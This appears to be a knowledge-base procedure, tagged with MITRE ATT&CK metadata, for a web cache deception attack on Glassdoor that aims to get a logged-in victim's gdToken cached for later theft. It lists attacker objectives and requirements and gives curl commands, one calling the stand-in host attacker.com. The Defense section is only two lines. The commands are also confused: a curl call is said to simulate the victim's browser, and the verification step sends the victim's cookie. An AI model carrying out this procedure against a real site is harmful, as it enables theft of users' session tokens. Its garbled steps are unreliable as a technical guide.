---
tags:
  - web-cache-deception
  - social-engineering
type: procedure
tools:
  - '[[tools/Web-Cache-Deception-Concept]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-manipulate-url-for-caching]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 665effba-8c6d-41d7-920b-2b8cc22c7d72
created_at: '2025-12-13T09:00:34.604Z'
updated_at: '2025-12-13T09:00:34.604Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Force Victim to Cache gdToken via Deceptive URL

## Summary

This procedure forces a logged-in victim to load a deceptive URL that caches their sensitive data, such as gdToken, by embedding it in an attacker-controlled page.

## Description

By tricking the victim into visiting a page that loads the manipulated URL (e.g., via img tag), the web cache stores the victim's response. This is key for subsequent retrieval in web cache deception attacks on Glassdoor.

## Requirements

1. Attacker-controlled web page
2. Victim logged into target application
3. Network access to trigger the request

## Defense

Defensive measures and detection strategies:

- Use strict cache-control headers
- Detect anomalous requests to dynamic endpoints with static extensions

## Objectives

1. Induce victim to trigger caching
2. Store gdToken in cache
3. Prepare for token extraction

## Instructions

### Step 1: Host Attacker Page

**Context**: Create a page with embedded request to deceptive URL.

**Command** ([[commands/curl-manipulate-url-for-caching]]):
```bash
curl "https://attacker.com/page-with-img?src=https://www.glassdoor.com/dynamic-endpoint.css"
```

> This simulates the victim's browser loading the URL.

### Step 2: Verify Caching

**Context**: Confirm the response was cached.

**Command** ([[commands/curl-manipulate-url-for-caching]]):
```bash
curl "https://www.glassdoor.com/dynamic-endpoint.css" -H "Cookie: victim-session-cookie"
```

> Check if cache hit occurs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-manipulate-url-for-caching]]

## Tools Used

- [[tools/Web-Cache-Deception-Concept]]

## Tags

- web-cache-deception
- social-engineering
